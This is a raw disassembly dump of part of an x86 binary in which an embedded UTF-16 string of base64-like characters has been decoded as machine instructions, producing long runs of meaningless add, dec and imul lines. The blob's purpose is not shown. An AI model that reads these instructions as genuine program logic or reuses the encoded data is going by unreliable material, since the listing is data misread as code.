  40572d:	4d                   	dec    %ebp
  40572e:	00 31                	add    %dh,(%ecx)
  405730:	00 33                	add    %dh,(%ebx)
  405732:	00 49 00             	add    %cl,0x0(%ecx)
  405735:	39 00                	cmp    %eax,(%eax)
  405737:	6b 00 48             	imul   $0x48,(%eax),%eax
  40573a:	00 55 00             	add    %dl,0x0(%ebp)
  40573d:	61                   	popa
  40573e:	00 52 00             	add    %dl,0x0(%edx)
  405741:	49                   	dec    %ecx
  405742:	00 4e 00             	add    %cl,0x0(%esi)
  405745:	75 00                	jne    0x405747
  405747:	52                   	push   %edx
  405748:	00 62 00             	add    %ah,0x0(%edx)
  40574b:	6e                   	outsb  %ds:(%esi),(%dx)
  40574c:	00 58 00             	add    %bl,0x0(%eax)
  40574f:	6c                   	insb   (%dx),%es:(%edi)
  405750:	00 47 00             	add    %al,0x0(%edi)
  405753:	44                   	inc    %esp
  405754:	00 75 00             	add    %dh,0x0(%ebp)
  405757:	39 00                	cmp    %eax,(%eax)
  405759:	59                   	pop    %ecx
  40575a:	00 36                	add    %dh,(%esi)
  40575c:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  405760:	00 53 00             	add    %dl,0x0(%ebx)
  405763:	6e                   	outsb  %ds:(%esi),(%dx)
  405764:	00 6e 00             	add    %ch,0x0(%esi)
  405767:	49                   	dec    %ecx
  405768:	00 34 00             	add    %dh,(%eax,%eax,1)
  40576b:	4e                   	dec    %esi
  40576c:	00 76 00             	add    %dh,0x0(%esi)
  40576f:	6e                   	outsb  %ds:(%esi),(%dx)
  405770:	00 59 00             	add    %bl,0x0(%ecx)
  405773:	65 00 36             	add    %dh,%gs:(%esi)
  405776:	00 69 00             	add    %ch,0x0(%ecx)
  405779:	4a                   	dec    %edx
  40577a:	00 36                	add    %dh,(%esi)
  40577c:	00 37                	add    %dh,(%edi)
  40577e:	00 62 00             	add    %ah,0x0(%edx)
  405781:	75 00                	jne    0x405783
  405783:	50                   	push   %eax
  405784:	00 51 00             	add    %dl,0x0(%ecx)
  405787:	32 00                	xor    (%eax),%al
  405789:	42                   	inc    %edx
  40578a:	00 38                	add    %bh,(%eax)
  40578c:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  405790:	00 35 00 7a 00 54    	add    %dh,0x54007a00
  405796:	00 45 00             	add    %al,0x0(%ebp)
  405799:	39 00                	cmp    %eax,(%eax)
  40579b:	41                   	inc    %ecx
  40579c:	00 48 00             	add    %cl,0x0(%eax)
  40579f:	65 00 37             	add    %dh,%gs:(%edi)
  4057a2:	00 51 00             	add    %dl,0x0(%ecx)
  4057a5:	36 00 74 00 75       	add    %dh,%ss:0x75(%eax,%eax,1)
  4057aa:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  4057ae:	00 4d 00             	add    %cl,0x0(%ebp)
  4057b1:	4e                   	dec    %esi
  4057b2:	00 65 00             	add    %ah,0x0(%ebp)
  4057b5:	5a                   	pop    %edx
  4057b6:	00 35 00 32 00 33    	add    %dh,0x33003200
  4057bc:	00 63 00             	add    %ah,0x0(%ebx)
  4057bf:	6a 00                	push   $0x0
  4057c1:	31 00                	xor    %eax,(%eax)
  4057c3:	71 00                	jno    0x4057c5
  4057c5:	7a 00                	jp     0x4057c7
  4057c7:	4b                   	dec    %ebx
  4057c8:	00 2b                	add    %ch,(%ebx)
  4057ca:	00 48 00             	add    %cl,0x0(%eax)
  4057cd:	2b 00                	sub    (%eax),%eax
  4057cf:	79 00                	jns    0x4057d1
  4057d1:	59                   	pop    %ecx
  4057d2:	00 52 00             	add    %dl,0x0(%edx)
  4057d5:	6d                   	insl   (%dx),%es:(%edi)
  4057d6:	00 66 00             	add    %ah,0x0(%esi)
  4057d9:	37                   	aaa
  4057da:	00 52 00             	add    %dl,0x0(%edx)
  4057dd:	34 00                	xor    $0x0,%al
  4057df:	63 00                	arpl   %eax,(%eax)
  4057e1:	6b 00 74             	imul   $0x74,(%eax),%eax
  4057e4:	00 76 00             	add    %dh,0x0(%esi)
  4057e7:	38 00                	cmp    %al,(%eax)
  4057e9:	45                   	inc    %ebp
  4057ea:	00 4a 00             	add    %cl,0x0(%edx)
  4057ed:	2b 00                	sub    (%eax),%eax
  4057ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4057f0:	00 69 00             	add    %ch,0x0(%ecx)
  4057f3:	76 00                	jbe    0x4057f5
  4057f5:	68 00 75 00 5a       	push   $0x5a007500
  4057fa:	00 52 00             	add    %dl,0x0(%edx)
  4057fd:	4d                   	dec    %ebp
  4057fe:	00 68 00             	add    %ch,0x0(%eax)
  405801:	35 00 72 00 56       	xor    $0x56007200,%eax
  405806:	00 57 00             	add    %dl,0x0(%edi)
  405809:	7a 00                	jp     0x40580b
  40580b:	54                   	push   %esp
  40580c:	00 6b 00             	add    %ch,0x0(%ebx)
  40580f:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  405813:	76 00                	jbe    0x405815
  405815:	33 00                	xor    (%eax),%eax
  405817:	43                   	inc    %ebx
  405818:	00 78 00             	add    %bh,0x0(%eax)
  40581b:	6f                   	outsl  %ds:(%esi),(%dx)
  40581c:	00 79 00             	add    %bh,0x0(%ecx)
  40581f:	6b 00 61             	imul   $0x61,(%eax),%eax
  405822:	00 63 00             	add    %ah,0x0(%ebx)
  405825:	2f                   	das
  405826:	00 71 00             	add    %dh,0x0(%ecx)
  405829:	76 00                	jbe    0x40582b
  40582b:	73 00                	jae    0x40582d
  40582d:	73 00                	jae    0x40582f
  40582f:	74 00                	je     0x405831
  405831:	58                   	pop    %eax
  405832:	00 63 00             	add    %ah,0x0(%ebx)
  405835:	46                   	inc    %esi
  405836:	00 48 00             	add    %cl,0x0(%eax)
  405839:	56                   	push   %esi
  40583a:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  40583e:	00 52 00             	add    %dl,0x0(%edx)
  405841:	6b 00 53             	imul   $0x53,(%eax),%eax
  405844:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  405848:	00 51 00             	add    %dl,0x0(%ecx)
  40584b:	33 00                	xor    (%eax),%eax
  40584d:	51                   	push   %ecx
  40584e:	00 38                	add    %bh,(%eax)
  405850:	00 57 00             	add    %dl,0x0(%edi)
  405853:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  405857:	42                   	inc    %edx
  405858:	00 70 00             	add    %dh,0x0(%eax)
  40585b:	35 00 75 00 35       	xor    $0x35007500,%eax
  405860:	00 4b 00             	add    %cl,0x0(%ebx)
  405863:	2f                   	das
  405864:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  405868:	00 62 00             	add    %ah,0x0(%edx)
  40586b:	6e                   	outsb  %ds:(%esi),(%dx)
  40586c:	00 63 00             	add    %ah,0x0(%ebx)
  40586f:	77 00                	ja     0x405871
  405871:	41                   	inc    %ecx
  405872:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  405876:	00 32                	add    %dh,(%edx)
  405878:	00 31                	add    %dh,(%ecx)
  40587a:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40587e:	00 4e 00             	add    %cl,0x0(%esi)
  405881:	78 00                	js     0x405883
  405883:	65 00 64 00 57       	add    %ah,%gs:0x57(%eax,%eax,1)
  405888:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40588c:	00 62 00             	add    %ah,0x0(%edx)
  40588f:	43                   	inc    %ebx
  405890:	00 62 00             	add    %ah,0x0(%edx)
  405893:	2b 00                	sub    (%eax),%eax
  405895:	6c                   	insb   (%dx),%es:(%edi)
  405896:	00 36                	add    %dh,(%esi)
  405898:	00 45 00             	add    %al,0x0(%ebp)
  40589b:	6e                   	outsb  %ds:(%esi),(%dx)
  40589c:	00 51 00             	add    %dl,0x0(%ecx)
  40589f:	4c                   	dec    %esp
  4058a0:	00 79 00             	add    %bh,0x0(%ecx)
  4058a3:	4f                   	dec    %edi
  4058a4:	00 67 00             	add    %ah,0x0(%edi)
  4058a7:	39 00                	cmp    %eax,(%eax)
  4058a9:	33 00                	xor    (%eax),%eax
  4058ab:	72 00                	jb     0x4058ad
  4058ad:	4e                   	dec    %esi
  4058ae:	00 36                	add    %dh,(%esi)
  4058b0:	00 30                	add    %dh,(%eax)
  4058b2:	00 38                	add    %bh,(%eax)
  4058b4:	00 7a 00             	add    %bh,0x0(%edx)
  4058b7:	67 00 66 00          	add    %ah,0x0(%bp)
  4058bb:	41                   	inc    %ecx
  4058bc:	00 55 00             	add    %dl,0x0(%ebp)
  4058bf:	58                   	pop    %eax
  4058c0:	00 6a 00             	add    %ch,0x0(%edx)
  4058c3:	59                   	pop    %ecx
  4058c4:	00 35 00 75 00 43    	add    %dh,0x43007500
  4058ca:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  4058ce:	00 4a 00             	add    %cl,0x0(%edx)
  4058d1:	74 00                	je     0x4058d3
  4058d3:	31 00                	xor    %eax,(%eax)
  4058d5:	6c                   	insb   (%dx),%es:(%edi)
  4058d6:	00 77 00             	add    %dh,0x0(%edi)
  4058d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4058da:	00 70 00             	add    %dh,0x0(%eax)
  4058dd:	4e                   	dec    %esi
  4058de:	00 75 00             	add    %dh,0x0(%ebp)
  4058e1:	6d                   	insl   (%dx),%es:(%edi)
  4058e2:	00 50 00             	add    %dl,0x0(%eax)
  4058e5:	68 00 58 00 7a       	push   $0x7a005800
  4058ea:	00 59 00             	add    %bl,0x0(%ecx)
  4058ed:	47                   	inc    %edi
  4058ee:	00 4d 00             	add    %cl,0x0(%ebp)
  4058f1:	75 00                	jne    0x4058f3
  4058f3:	70 00                	jo     0x4058f5
  4058f5:	46                   	inc    %esi
  4058f6:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  4058fa:	00 4f 00             	add    %cl,0x0(%edi)
  4058fd:	75 00                	jne    0x4058ff
  4058ff:	59                   	pop    %ecx
  405900:	00 50 00             	add    %dl,0x0(%eax)
  405903:	41                   	inc    %ecx
  405904:	00 72 00             	add    %dh,0x0(%edx)
  405907:	75 00                	jne    0x405909
  405909:	43                   	inc    %ebx
  40590a:	00 79 00             	add    %bh,0x0(%ecx)
  40590d:	42                   	inc    %edx
  40590e:	00 67 00             	add    %ah,0x0(%edi)
  405911:	6f                   	outsl  %ds:(%esi),(%dx)
  405912:	00 4f 00             	add    %cl,0x0(%edi)
  405915:	77 00                	ja     0x405917
  405917:	4f                   	dec    %edi
  405918:	00 50 00             	add    %dl,0x0(%eax)
  40591b:	6a 00                	push   $0x0
  40591d:	41                   	inc    %ecx
  40591e:	00 47 00             	add    %al,0x0(%edi)
  405921:	79 00                	jns    0x405923
  405923:	4c                   	dec    %esp
  405924:	00 51 00             	add    %dl,0x0(%ecx)
  405927:	6d                   	insl   (%dx),%es:(%edi)
  405928:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40592c:	00 62 00             	add    %ah,0x0(%edx)
  40592f:	36 00 65 00          	add    %ah,%ss:0x0(%ebp)
  405933:	63 00                	arpl   %eax,(%eax)
  405935:	71 00                	jno    0x405937
  405937:	46                   	inc    %esi
  405938:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40593c:	00 62 00             	add    %ah,0x0(%edx)
  40593f:	52                   	push   %edx
  405940:	00 72 00             	add    %dh,0x0(%edx)
  405943:	6a 00                	push   $0x0
  405945:	50                   	push   %eax
  405946:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40594a:	00 65 00             	add    %ah,0x0(%ebp)
  40594d:	69 00 6e 00 53 00    	imul   $0x53006e,(%eax),%eax
  405953:	37                   	aaa
  405954:	00 30                	add    %dh,(%eax)
  405956:	00 32                	add    %dh,(%edx)
  405958:	00 48 00             	add    %cl,0x0(%eax)
  40595b:	68 00 53 00 57       	push   $0x57005300
  405960:	00 30                	add    %dh,(%eax)
  405962:	00 50 00             	add    %dl,0x0(%eax)
  405965:	62 00                	bound  %eax,(%eax)
  405967:	50                   	push   %eax
  405968:	00 31                	add    %dh,(%ecx)
  40596a:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40596e:	00 47 00             	add    %al,0x0(%edi)
  405971:	6a 00                	push   $0x0
  405973:	51                   	push   %ecx
  405974:	00 79 00             	add    %bh,0x0(%ecx)
  405977:	36 00 54 00 6f       	add    %dl,%ss:0x6f(%eax,%eax,1)
  40597c:	00 2f                	add    %ch,(%edi)
  40597e:	00 75 00             	add    %dh,0x0(%ebp)
  405981:	59                   	pop    %ecx
  405982:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  405986:	00 33                	add    %dh,(%ebx)
  405988:	00 38                	add    %bh,(%eax)
  40598a:	00 32                	add    %dh,(%edx)
  40598c:	00 51 00             	add    %dl,0x0(%ecx)
  40598f:	76 00                	jbe    0x405991
  405991:	77 00                	ja     0x405993
  405993:	7a 00                	jp     0x405995
  405995:	68 00 52 00 30       	push   $0x30005200
  40599a:	00 46 00             	add    %al,0x0(%esi)
  40599d:	68 00 55 00 34       	push   $0x34005500
  4059a2:	00 32                	add    %dh,(%edx)
  4059a4:	00 4f 00             	add    %cl,0x0(%edi)
  4059a7:	4b                   	dec    %ebx
  4059a8:	00 30                	add    %dh,(%eax)
  4059aa:	00 51 00             	add    %dl,0x0(%ecx)
  4059ad:	79 00                	jns    0x4059af
  4059af:	44                   	inc    %esp
  4059b0:	00 52 00             	add    %dl,0x0(%edx)
  4059b3:	2f                   	das
  4059b4:	00 46 00             	add    %al,0x0(%esi)
  4059b7:	74 00                	je     0x4059b9
  4059b9:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  4059bd:	68 00 38 00 49       	push   $0x49003800
  4059c2:	00 6d 00             	add    %ch,0x0(%ebp)
  4059c5:	62 00                	bound  %eax,(%eax)
  4059c7:	62 00                	bound  %eax,(%eax)
  4059c9:	4d                   	dec    %ebp
  4059ca:	00 59 00             	add    %bl,0x0(%ecx)
  4059cd:	75 00                	jne    0x4059cf
  4059cf:	77 00                	ja     0x4059d1
  4059d1:	77 00                	ja     0x4059d3
  4059d3:	48                   	dec    %eax
  4059d4:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  4059d8:	00 49 00             	add    %cl,0x0(%ecx)
  4059db:	47                   	inc    %edi
  4059dc:	00 72 00             	add    %dh,0x0(%edx)
  4059df:	5a                   	pop    %edx
  4059e0:	00 7a 00             	add    %bh,0x0(%edx)
  4059e3:	34 00                	xor    $0x0,%al
  4059e5:	37                   	aaa
  4059e6:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  4059ea:	00 38                	add    %bh,(%eax)
  4059ec:	00 32                	add    %dh,(%edx)
  4059ee:	00 70 00             	add    %dh,0x0(%eax)
  4059f1:	33 00                	xor    (%eax),%eax
  4059f3:	4c                   	dec    %esp
  4059f4:	00 78 00             	add    %bh,0x0(%eax)
  4059f7:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  4059fb:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  4059ff:	6d                   	insl   (%dx),%es:(%edi)
  405a00:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  405a04:	00 37                	add    %dh,(%edi)
  405a06:	00 31                	add    %dh,(%ecx)
  405a08:	00 33                	add    %dh,(%ebx)
  405a0a:	00 6d 00             	add    %ch,0x0(%ebp)
  405a0d:	55                   	push   %ebp
  405a0e:	00 48 00             	add    %cl,0x0(%eax)
  405a11:	54                   	push   %esp
  405a12:	00 63 00             	add    %ah,0x0(%ebx)
  405a15:	74 00                	je     0x405a17
  405a17:	6a 00                	push   $0x0
  405a19:	4b                   	dec    %ebx
  405a1a:	00 2f                	add    %ch,(%edi)
  405a1c:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  405a20:	00 50 00             	add    %dl,0x0(%eax)
  405a23:	69 00 54 00 56 00    	imul   $0x560054,(%eax),%eax
  405a29:	59                   	pop    %ecx
  405a2a:	00 71 00             	add    %dh,0x0(%ecx)
  405a2d:	6a 00                	push   $0x0
  405a2f:	34 00                	xor    $0x0,%al
  405a31:	4d                   	dec    %ebp
  405a32:	00 61 00             	add    %ah,0x0(%ecx)
  405a35:	78 00                	js     0x405a37
  405a37:	73 00                	jae    0x405a39
  405a39:	47                   	inc    %edi
  405a3a:	00 30                	add    %dh,(%eax)
  405a3c:	00 4d 00             	add    %cl,0x0(%ebp)
  405a3f:	65 00 33             	add    %dh,%gs:(%ebx)
  405a42:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  405a46:	00 2f                	add    %ch,(%edi)
  405a48:	00 51 00             	add    %dl,0x0(%ecx)
  405a4b:	37                   	aaa
  405a4c:	00 45 00             	add    %al,0x0(%ebp)
  405a4f:	63 00                	arpl   %eax,(%eax)
  405a51:	6f                   	outsl  %ds:(%esi),(%dx)
  405a52:	00 53 00             	add    %dl,0x0(%ebx)
  405a55:	74 00                	je     0x405a57
  405a57:	6d                   	insl   (%dx),%es:(%edi)
  405a58:	00 58 00             	add    %bl,0x0(%eax)
  405a5b:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  405a5f:	32 00                	xor    (%eax),%al
  405a61:	79 00                	jns    0x405a63
  405a63:	6f                   	outsl  %ds:(%esi),(%dx)
  405a64:	00 6f 00             	add    %ch,0x0(%edi)
  405a67:	31 00                	xor    %eax,(%eax)
  405a69:	44                   	inc    %esp
  405a6a:	00 34 00             	add    %dh,(%eax,%eax,1)
  405a6d:	66 00 67 00          	data16 add %ah,0x0(%edi)
  405a71:	61                   	popa
  405a72:	00 65 00             	add    %ah,0x0(%ebp)
  405a75:	52                   	push   %edx
  405a76:	00 69 00             	add    %ch,0x0(%ecx)
  405a79:	67 00 6d 00          	add    %ch,0x0(%di)
  405a7d:	66 00 67 00          	data16 add %ah,0x0(%edi)
  405a81:	5a                   	pop    %edx
  405a82:	00 69 00             	add    %ch,0x0(%ecx)
  405a85:	69 00 43 00 54 00    	imul   $0x540043,(%eax),%eax
  405a8b:	6a 00                	push   $0x0
  405a8d:	55                   	push   %ebp
  405a8e:	00 32                	add    %dh,(%edx)
  405a90:	00 2b                	add    %ch,(%ebx)
  405a92:	00 55 00             	add    %dl,0x0(%ebp)
  405a95:	68 00 6e 00 2f       	push   $0x2f006e00
  405a9a:	00 33                	add    %dh,(%ebx)
  405a9c:	00 79 00             	add    %bh,0x0(%ecx)
  405a9f:	4a                   	dec    %edx
  405aa0:	00 51 00             	add    %dl,0x0(%ecx)
  405aa3:	2f                   	das
  405aa4:	00 77 00             	add    %dh,0x0(%edi)
  405aa7:	38 00                	cmp    %al,(%eax)
  405aa9:	42                   	inc    %edx
  405aaa:	00 77 00             	add    %dh,0x0(%edi)
  405aad:	31 00                	xor    %eax,(%eax)
  405aaf:	76 00                	jbe    0x405ab1
  405ab1:	33 00                	xor    (%eax),%eax
  405ab3:	68 00 74 00 58       	push   $0x58007400
  405ab8:	00 6a 00             	add    %ch,0x0(%edx)
  405abb:	38 00                	cmp    %al,(%eax)
  405abd:	6f                   	outsl  %ds:(%esi),(%dx)
  405abe:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  405ac2:	00 51 00             	add    %dl,0x0(%ecx)
  405ac5:	34 00                	xor    $0x0,%al
  405ac7:	39 00                	cmp    %eax,(%eax)
  405ac9:	78 00                	js     0x405acb
  405acb:	6e                   	outsb  %ds:(%esi),(%dx)
  405acc:	00 38                	add    %bh,(%eax)
  405ace:	00 77 00             	add    %dh,0x0(%edi)
  405ad1:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  405ad4:	00 4b 00             	add    %cl,0x0(%ebx)
  405ad7:	6b 00 30             	imul   $0x30,(%eax),%eax
  405ada:	00 4e 00             	add    %cl,0x0(%esi)
  405add:	57                   	push   %edi
  405ade:	00 46 00             	add    %al,0x0(%esi)
  405ae1:	71 00                	jno    0x405ae3
  405ae3:	78 00                	js     0x405ae5
  405ae5:	78 00                	js     0x405ae7
  405ae7:	67 00 39             	add    %bh,(%bx,%di)
  405aea:	00 61 00             	add    %ah,0x0(%ecx)
  405aed:	37                   	aaa
  405aee:	00 42 00             	add    %al,0x0(%edx)
  405af1:	31 00                	xor    %eax,(%eax)
  405af3:	74 00                	je     0x405af5
  405af5:	47                   	inc    %edi
  405af6:	00 69 00             	add    %ch,0x0(%ecx)
  405af9:	4e                   	dec    %esi
  405afa:	00 4e 00             	add    %cl,0x0(%esi)
  405afd:	39 00                	cmp    %eax,(%eax)
  405aff:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  405b03:	4a                   	dec    %edx
  405b04:	00 4b 00             	add    %cl,0x0(%ebx)
  405b07:	6f                   	outsl  %ds:(%esi),(%dx)
  405b08:	00 2f                	add    %ch,(%edi)
  405b0a:	00 6b 00             	add    %ch,0x0(%ebx)
  405b0d:	73 00                	jae    0x405b0f
  405b0f:	4d                   	dec    %ebp
  405b10:	00 45 00             	add    %al,0x0(%ebp)
  405b13:	62 00                	bound  %eax,(%eax)
  405b15:	6a 00                	push   $0x0
  405b17:	2f                   	das
  405b18:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  405b1c:	00 4d 00             	add    %cl,0x0(%ebp)
  405b1f:	74 00                	je     0x405b21
  405b21:	2b 00                	sub    (%eax),%eax
  405b23:	4d                   	dec    %ebp
  405b24:	00 6d 00             	add    %ch,0x0(%ebp)
  405b27:	38 00                	cmp    %al,(%eax)
  405b29:	39 00                	cmp    %eax,(%eax)
  405b2b:	44                   	inc    %esp
  405b2c:	00 32                	add    %dh,(%edx)
  405b2e:	00 52 00             	add    %dl,0x0(%edx)
  405b31:	35 00 44 00 48       	xor    $0x48004400,%eax
  405b36:	00 31                	add    %dh,(%ecx)
  405b38:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  405b3c:	00 2f                	add    %ch,(%edi)
  405b3e:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  405b42:	00 63 00             	add    %ah,0x0(%ebx)
  405b45:	59                   	pop    %ecx
  405b46:	00 49 00             	add    %cl,0x0(%ecx)
  405b49:	63 00                	arpl   %eax,(%eax)
  405b4b:	34 00                	xor    $0x0,%al
  405b4d:	73 00                	jae    0x405b4f
  405b4f:	69 00 6e 00 38 00    	imul   $0x38006e,(%eax),%eax
  405b55:	79 00                	jns    0x405b57
  405b57:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  405b5b:	6d                   	insl   (%dx),%es:(%edi)
  405b5c:	00 53 00             	add    %dl,0x0(%ebx)
  405b5f:	57                   	push   %edi
  405b60:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  405b64:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  405b68:	00 5a 00             	add    %bl,0x0(%edx)
  405b6b:	32 00                	xor    (%eax),%al
  405b6d:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  405b71:	31 00                	xor    %eax,(%eax)
  405b73:	62 00                	bound  %eax,(%eax)
  405b75:	41                   	inc    %ecx
  405b76:	00 6a 00             	add    %ch,0x0(%edx)
  405b79:	4f                   	dec    %edi
  405b7a:	00 47 00             	add    %al,0x0(%edi)
  405b7d:	4b                   	dec    %ebx
  405b7e:	00 7a 00             	add    %bh,0x0(%edx)
  405b81:	74 00                	je     0x405b83
  405b83:	7a 00                	jp     0x405b85
  405b85:	58                   	pop    %eax
  405b86:	00 6f 00             	add    %ch,0x0(%edi)
  405b89:	59                   	pop    %ecx
  405b8a:	00 6e 00             	add    %ch,0x0(%esi)
  405b8d:	7a 00                	jp     0x405b8f
  405b8f:	54                   	push   %esp
  405b90:	00 39                	add    %bh,(%ecx)
  405b92:	00 4a 00             	add    %cl,0x0(%edx)
  405b95:	34 00                	xor    $0x0,%al
  405b97:	72 00                	jb     0x405b99
  405b99:	4d                   	dec    %ebp
  405b9a:	00 77 00             	add    %dh,0x0(%edi)
  405b9d:	6b 00 30             	imul   $0x30,(%eax),%eax
  405ba0:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  405ba4:	00 57 00             	add    %dl,0x0(%edi)
  405ba7:	73 00                	jae    0x405ba9
  405ba9:	46                   	inc    %esi
  405baa:	00 6f 00             	add    %ch,0x0(%edi)
  405bad:	62 00                	bound  %eax,(%eax)
  405baf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405bb3:	45                   	inc    %ebp
  405bb4:	00 47 00             	add    %al,0x0(%edi)
  405bb7:	2f                   	das
  405bb8:	00 5a 00             	add    %bl,0x0(%edx)
  405bbb:	4b                   	dec    %ebx
  405bbc:	00 6d 00             	add    %ch,0x0(%ebp)
  405bbf:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  405bc3:	5a                   	pop    %edx
  405bc4:	00 72 00             	add    %dh,0x0(%edx)
  405bc7:	5a                   	pop    %edx
  405bc8:	00 61 00             	add    %ah,0x0(%ecx)
  405bcb:	4b                   	dec    %ebx
  405bcc:	00 6a 00             	add    %ch,0x0(%edx)
  405bcf:	75 00                	jne    0x405bd1
  405bd1:	49                   	dec    %ecx
  405bd2:	00 68 00             	add    %ch,0x0(%eax)
  405bd5:	4c                   	dec    %esp
  405bd6:	00 6f 00             	add    %ch,0x0(%edi)
  405bd9:	69 00 76 00 4e 00    	imul   $0x4e0076,(%eax),%eax
  405bdf:	31 00                	xor    %eax,(%eax)
  405be1:	74 00                	je     0x405be3
  405be3:	69 00 38 00 49 00    	imul   $0x490038,(%eax),%eax
  405be9:	30 00                	xor    %al,(%eax)
  405beb:	59                   	pop    %ecx
  405bec:	00 30                	add    %dh,(%eax)
  405bee:	00 56 00             	add    %dl,0x0(%esi)
  405bf1:	78 00                	js     0x405bf3
  405bf3:	74 00                	je     0x405bf5
  405bf5:	43                   	inc    %ebx
  405bf6:	00 70 00             	add    %dh,0x0(%eax)
  405bf9:	5a                   	pop    %edx
  405bfa:	00 67 00             	add    %ah,0x0(%edi)
  405bfd:	2b 00                	sub    (%eax),%eax
  405bff:	33 00                	xor    (%eax),%eax
  405c01:	42                   	inc    %edx
  405c02:	00 47 00             	add    %al,0x0(%edi)
  405c05:	63 00                	arpl   %eax,(%eax)
  405c07:	77 00                	ja     0x405c09
  405c09:	69 00 49 00 4f 00    	imul   $0x4f0049,(%eax),%eax
  405c0f:	72 00                	jb     0x405c11
  405c11:	64 00 44 00 52       	add    %al,%fs:0x52(%eax,%eax,1)
  405c16:	00 2f                	add    %ch,(%edi)
  405c18:	00 38                	add    %bh,(%eax)
  405c1a:	00 67 00             	add    %ah,0x0(%edi)
  405c1d:	47                   	inc    %edi
  405c1e:	00 58 00             	add    %bl,0x0(%eax)
  405c21:	75 00                	jne    0x405c23
  405c23:	30 00                	xor    %al,(%eax)
  405c25:	46                   	inc    %esi
  405c26:	00 35 00 4e 00 38    	add    %dh,0x38004e00
  405c2c:	00 69 00             	add    %ch,0x0(%ecx)
  405c2f:	55                   	push   %ebp
  405c30:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  405c34:	00 57 00             	add    %dl,0x0(%edi)
  405c37:	7a 00                	jp     0x405c39
  405c39:	38 00                	cmp    %al,(%eax)
  405c3b:	5a                   	pop    %edx
  405c3c:	00 33                	add    %dh,(%ebx)
  405c3e:	00 45 00             	add    %al,0x0(%ebp)
  405c41:	51                   	push   %ecx
  405c42:	00 4e 00             	add    %cl,0x0(%esi)
  405c45:	6c                   	insb   (%dx),%es:(%edi)
  405c46:	00 65 00             	add    %ah,0x0(%ebp)
  405c49:	6c                   	insb   (%dx),%es:(%edi)
  405c4a:	00 2b                	add    %ch,(%ebx)
  405c4c:	00 31                	add    %dh,(%ecx)
  405c4e:	00 7a 00             	add    %bh,0x0(%edx)
  405c51:	69 00 2b 00 64 00    	imul   $0x64002b,(%eax),%eax
  405c57:	4c                   	dec    %esp
  405c58:	00 67 00             	add    %ah,0x0(%edi)
  405c5b:	5a                   	pop    %edx
  405c5c:	00 61 00             	add    %ah,0x0(%ecx)
  405c5f:	46                   	inc    %esi
  405c60:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  405c64:	00 57 00             	add    %dl,0x0(%edi)
  405c67:	75 00                	jne    0x405c69
  405c69:	70 00                	jo     0x405c6b
  405c6b:	4b                   	dec    %ebx
  405c6c:	00 56 00             	add    %dl,0x0(%esi)
  405c6f:	72 00                	jb     0x405c71
  405c71:	35 00 51 00 77       	xor    $0x77005100,%eax
  405c76:	00 65 00             	add    %ah,0x0(%ebp)
  405c79:	6b 00 54             	imul   $0x54,(%eax),%eax
  405c7c:	00 42 00             	add    %al,0x0(%edx)
  405c7f:	54                   	push   %esp
  405c80:	00 75 00             	add    %dh,0x0(%ebp)
  405c83:	35 00 59 00 43       	xor    $0x43005900,%eax
  405c88:	00 48 00             	add    %cl,0x0(%eax)
  405c8b:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  405c8f:	61                   	popa
  405c90:	00 78 00             	add    %bh,0x0(%eax)
  405c93:	50                   	push   %eax
  405c94:	00 75 00             	add    %dh,0x0(%ebp)
  405c97:	75 00                	jne    0x405c99
  405c99:	4c                   	dec    %esp
  405c9a:	00 2f                	add    %ch,(%edi)
  405c9c:	00 31                	add    %dh,(%ecx)
  405c9e:	00 4e 00             	add    %cl,0x0(%esi)
  405ca1:	32 00                	xor    (%eax),%al
  405ca3:	70 00                	jo     0x405ca5
  405ca5:	58                   	pop    %eax
  405ca6:	00 65 00             	add    %ah,0x0(%ebp)
  405ca9:	48                   	dec    %eax
  405caa:	00 48 00             	add    %cl,0x0(%eax)
  405cad:	4a                   	dec    %edx
  405cae:	00 34 00             	add    %dh,(%eax,%eax,1)
  405cb1:	33 00                	xor    (%eax),%eax
  405cb3:	69 00 35 00 39 00    	imul   $0x390035,(%eax),%eax
